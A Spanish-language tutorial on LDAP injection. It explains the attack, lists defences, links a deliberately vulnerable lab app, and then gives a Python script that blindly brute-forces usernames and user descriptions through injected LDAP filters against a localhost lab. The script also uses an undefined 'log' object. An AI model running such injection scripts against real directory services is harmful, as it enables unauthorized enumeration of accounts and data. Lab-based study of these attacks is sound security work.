---
title: Inyecciones LDAP
---
Las inyecciones **LDAP** (**Protocolo de Directorio Ligero**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.

La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

Al igual que las inyecciones SQL y NoSQL, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:

-   Acceder a información de usuarios o recursos que no debería tener acceso.
-   Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar o eliminar usuarios o recursos.
-   Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red.

Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.

A continuación, se proporciona el enlace directo al proyecto de Github que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:

-   **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

-------
## Renocimiento de usuarios y contraseñas potenciales
```python
#!/usr/bin/python3
 
import requests
import time 
import sys
import signal
import string
import pdb
 
def def_handler(sig, frame):
    print("\n\n[+] Saliendo...\n")
    sys.exit(1)
 
signal.signal(signal.SIGINT, def_handler)
 
 
# Variables globales
main_url = "http://localhost:8888/"
burp = {'http': 'http://127.0.0.1:8080'}
 
def getInitialUsers():
 
    characters = string.ascii_lowercase
 
    initial_users = []
 
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    for character in characters:
 
        post_data = "user_id={}*&password=*&login=1&submit-Submit".format(character)
 
        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False, proxies=burp)
        if r.status_code == 301:
            initial_users.append(character)
 
 
    return initial_users
 
def getUsers(initial_users):
 
    characters = string.ascii_lowercase + string.digits
 
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    valid_users = []
 
    for first_character in initial_users:
 
        user= ""
 
        for position in range(0, 15):
            for character in characters:
 
                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)
 
                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
 
                if r.status_code == 301:
 
                    user += character
                    break
 
        valid_users.append(first_character + user)
 
    for user in valid_users:
        log.info('[+] Usuario valido encontrado: %s' % user)
 
    return valid_users
 
def getDescription(user):
 
    characters = string.ascii_lowercase + ' '
 
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
    description = ""
 
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
 
    time.sleep(2)
 
    p2 = log.progress("Descripcion")
 
    for position in range(0,50):
        for character in characters:
 
            post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character)
            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
 
            if r.status_code == 301:
                description += character 
                p2.status(description)
                break
 
    p1.success("Proceso de fuerza bruta concluido")
    p2.success("La descripcion del usuario es: %s" % description)
 
if __name__ == '__main__':
 
    initial_users = getInitialUsers()
    valid_users = getUsers(initial_users)
 
    getDescription(valid_users[1])
```
